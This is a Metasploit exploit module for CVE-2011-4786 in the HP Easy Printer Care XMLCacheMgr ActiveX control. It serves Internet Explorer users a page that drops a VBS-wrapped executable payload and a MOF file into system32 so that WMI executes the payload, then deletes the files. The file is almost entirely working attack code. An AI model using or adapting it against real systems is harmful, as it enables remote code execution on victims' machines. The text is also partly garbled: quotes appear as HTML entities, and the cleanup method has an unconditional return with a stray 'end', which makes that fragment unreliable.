# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::EXE
    include Msf::Exploit::WbemExec
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;HP Easy Printer Care XMLCacheMgr Class ActiveX Control Remote Code Execution&#039;,
            &#039;Description&#039;    => %q{
                    This module allows remote attackers to place arbitrary files on a users file
                system by abusing the "CacheDocumentXMLWithId" method from the "XMLCacheMgr"
                class in the HP Easy Printer HPTicketMgr.dll ActiveX Control (HPTicketMgr.dll
                2.7.2.0).
 
                    Code execution can be achieved by first uploading the payload to the remote
                machine embeddeding a vbs file, and then upload another mof file, which enables
                Windows Management Instrumentation service to execute the vbs. Please note that
                this module currently only works for Windows before Vista.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Andrea Micalizzi&#039;,  # aka rgod original discovery
                    &#039;juan vazquez&#039;,      # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-4786&#039;],
                    [ &#039;BID&#039;, &#039;51396&#039;],
                    [ &#039;URL&#039;, &#039;http://www.zerodayinitiative.com/advisories/ZDI-12-013/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;           => 2048,
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    #Windows before Vista
                    [ &#039;Automatic&#039;, { } ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Jan 11 2012&#039;))
    end
 
    #
    # The following handles deleting the copied vbs payload and mof file
    # See "struts_code_exec.rb" and "ms10_026_dbldecode.rb" for more information.
    #
    def on_new_session(client)
 
            print_error("The vbs payload and mof file must be removed manually.")
            return
        end
 
        return if not @var_mof_name
        return if not @var_vbs_name
 
        # stdapi must be loaded before we can use fs.file
        client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
 
        cmd = "C:\\windows\\system32\\attrib.exe -r " +
              "C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof"
 
        client.sys.process.execute(cmd, nil, {&#039;Hidden&#039; => true })
 
        begin
            print_status("Deleting the vbs payload \"#{@var_vbs_name}.vbs\" ...")
            client.fs.file.rm("C:\\windows\\system32\\" + @var_vbs_name + ".vbs")
            print_status("Deleting the mof file \"#{@var_mof_name}.mof\" ...")
            client.fs.file.rm("C:\\windows\\system32\\wbem\\mof\\good\\" + @var_mof_name + ".mof")
        rescue ::Exception => e
            print_error("Exception: #{e.inspect}")
        end
 
    end
 
    def on_request_uri(cli, request)
 
        unless request[&#039;User-Agent&#039;] =~ /MSIE/
            send_not_found(cli)
            print_error("#{cli.peerhost}:#{cli.peerport} Unknown user-agent")
            return
        end
 
        # Using Windows Management Instrumentation service to execute the payload.
        # Using code from "blackice_downloadimagefileurl.rb". See it for more information.
 
        var_xmlcachemgr = rand_text_alpha(rand(5)+5)
        var_mof_function_name = rand_text_alpha(rand(5)+5)
 
        content = <<-EOS
        <html>
        <head>
        <script>
            var #{var_xmlcachemgr} = new ActiveXObject(&#039;HPESPRIT.XMLCacheMgr.1&#039;);
 
            function #{var_mof_function_name}() {
                #{var_xmlcachemgr}.CacheDocumentXMLWithId(
                    "c:\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{@var_mof_name}.mof",
                    unescape("#{@mof_content}"),
                    1,
                    1
                );
            }
 
            #{var_xmlcachemgr}.CacheDocumentXMLWithId(
                "C:\\\\WINDOWS\\\\system32\\\\#{@var_vbs_name}.vbs",
                unescape("#{@vbs_content}"),
                1,
                1
            );
 
            setTimeout("#{var_mof_function_name}()", 4000);
        </script>
        </head>
        </html>
        EOS
 
        print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")
        send_response_html(cli, content)
        handler(cli)
    end
 
    def exploit
        # In order to save binary data to the file system the payload is written to a .vbs
        # file and execute it from there.
        @var_mof_name = rand_text_alpha(rand(5)+5)
        @var_vbs_name = rand_text_alpha(rand(5)+5)
 
        print_status("Encoding payload into vbs...")
        payload = generate_payload_exe
        @vbs_content = Rex::Text.to_hex(Msf::Util::EXE.to_exe_vbs(payload))
 
        print_status("Generating mof file...")
        @mof_content = Rex::Text.to_hex(generate_mof("#{@var_mof_name}.mof", "#{@var_vbs_name}.vbs"))
        super
    end
 
end



